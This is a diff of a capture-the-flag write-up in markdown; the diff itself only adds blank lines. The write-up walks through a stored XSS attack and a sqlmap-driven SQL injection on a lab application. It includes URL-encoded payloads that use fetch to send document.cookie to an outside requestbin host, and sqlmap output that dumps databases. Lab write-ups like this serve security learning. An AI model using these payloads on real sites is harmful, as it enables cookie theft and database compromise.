@@ -221,7 +221,9 @@ How do we craft a stored XSS payload in an attempt to steal one’s cookie? Duri
 -	https://brutelogic.com.br/blog/xss101/
 
 In this challenge, not only we have to be aware of the input filtering in place, which leads us to a certain level of URL encoding, we have to keep on trial and error to see if we can capture the document.cookie from the victim clients who visited this page of the application injected with stored XSS
+
 **Step 1 - Proving XSS exist**
+
 Initially, I tested the Record List with the encoded XSS payload to prove that I can capture a document.cookie
 
 ```
@@ -233,7 +235,9 @@ hrs=1&reason=%22%3e%3csvg%2fonload%3dalert%28document.cookie%29%3e
 
 
 **Step 2 – Proving XSS can send to our requestbin server**
+
 `Onload=fetch()` is a good payload to perform such action
+
 ```
 Upgrade-Insecure-Requests: 1
 
@@ -244,6 +248,7 @@ hrs=1&reason= %22%3e%3csvg%2fonload%3dfetch%60https%3a%2f%2fen8bq7uoc2g7wz3%2em%
 ![image](https://user-images.githubusercontent.com/94167587/144216221-7ca07c83-4bb9-4748-8cd9-2e44460bb6c0.png)
 
 **Step 3 – Combining the both**
+
 `<svg onload=fetch( ' //HOST/?cookie= ' +document.cookie)` is supposed to be a good payload. However, upon further trial and error, I realize a space or %20 is something this server does not like (input filtering). Worse, even if it succeeds sending to our requestbin server, document.cookie is not captured ☹ 
  
 ![image](https://user-images.githubusercontent.com/94167587/144216262-004691bb-fc7e-46d9-9752-1a9babe0d7a9.png)
@@ -269,11 +274,13 @@ An URL decoded look of my final payload looks like this:
 Voila~ Shouldn’t have taken me that long!
 
 **Flag 3** 
+
 Last but not least, flag 3 is about the formidable SQL injection, at least we know that from the hint given. And the fact that it requires Admin rights (via compromise of flag 1) is obvious that the injection point lies within one of the functions in Administrative panel.
  
 ![image](https://user-images.githubusercontent.com/94167587/144216370-13a1a70e-fbf7-4da4-99c1-2310fb3c1029.png)
 
 **Enumeration**
+
 Having said that, this is not an easy SQLi point to find. I have encountered such function while doing flag 2 but because of this it also blinded me from thinking that it is related to flag 3. In a real test, however, we should go through each of the functionality one by one (and systematically) so we won’t miss any. (or, for completeness since the client paid us for that)
 I went through an awful lots of admin functions such as the Search function in Full Summary or Add User which I come across in testing because they are usually the weak spots. Yet, unfortunately, the injection points aren’t there. It’s until I revisit the Records Management I was able to discover a SQL injection point at the `Save Status` function. 
  
@@ -306,10 +313,13 @@ The response of such request has revealed a SQL error message after supplementin
 ```
 Error: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '1352'' at line 1	
 ```
+
 **SQLMap**
+
 For this SQLi, I leverage the help from sqlmap, which comes in handy (also lazy). Many people would recommend a manual exploitation to understand SQLinjection, which I cannot agree more.
 
 **Step 1 – Confirming the injection point**
+
 I first save the request into a *search.req* file so I can parse the request easily when using SQLinjection
 Next, I use the `–current-user` extension to confirm the injection point.
 ```
@@ -347,7 +357,9 @@ current user: 'root@%'
 
 [*] ending @ 19:03:19 /2021-11-30/
 ```  
+
 **Step 2 – Dumping the databases, then table content**
+
 I made a mistake by trying to dump the table (i.e. flag) first, which wouldn’t succeed. Yes, I already know the table name “flag” from the CTF hint, but still, we have to go step by step.
  
 ![image](https://user-images.githubusercontent.com/94167587/144216777-192b9610-795e-4083-8102-b94765921d68.png)
